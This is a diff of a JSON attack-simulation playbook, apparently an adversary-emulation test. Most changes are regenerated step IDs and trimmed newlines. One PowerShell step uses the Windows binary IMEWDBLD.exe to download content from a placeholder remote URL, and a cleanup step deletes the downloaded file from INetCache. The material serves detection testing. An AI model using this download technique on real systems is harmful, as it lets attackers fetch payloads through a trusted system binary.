@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "da65083d-fbc7-4216-aafa-e88703222062",
+      "id": "00f4e79d-6a60-411a-9658-5366b68c8fb9",
       "type": "execute-command",
       "data": {
-        "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n\u0026 $imewdbled #{remote_url}\n",
+        "command": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\"\n\u0026 $imewdbled #{remote_url}",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "8b13f256-19e2-4718-9777-f6b80e4c57eb",
+      "id": "d7bd6587-dffb-4e26-aa3e-560d7096dd15",
       "type": "execute-command",
       "data": {
-        "command": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }\n",
+        "command": "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "da65083d-fbc7-4216-aafa-e88703222062",
+      "s": "00f4e79d-6a60-411a-9658-5366b68c8fb9",
       "p": "on-success",
-      "o": "8b13f256-19e2-4718-9777-f6b80e4c57eb"
+      "o": "d7bd6587-dffb-4e26-aa3e-560d7096dd15"
     },
     {
-      "s": "da65083d-fbc7-4216-aafa-e88703222062",
+      "s": "00f4e79d-6a60-411a-9658-5366b68c8fb9",
       "p": "on-failure",
-      "o": "8b13f256-19e2-4718-9777-f6b80e4c57eb"
+      "o": "d7bd6587-dffb-4e26-aa3e-560d7096dd15"
     }
   ],
   "tags": [
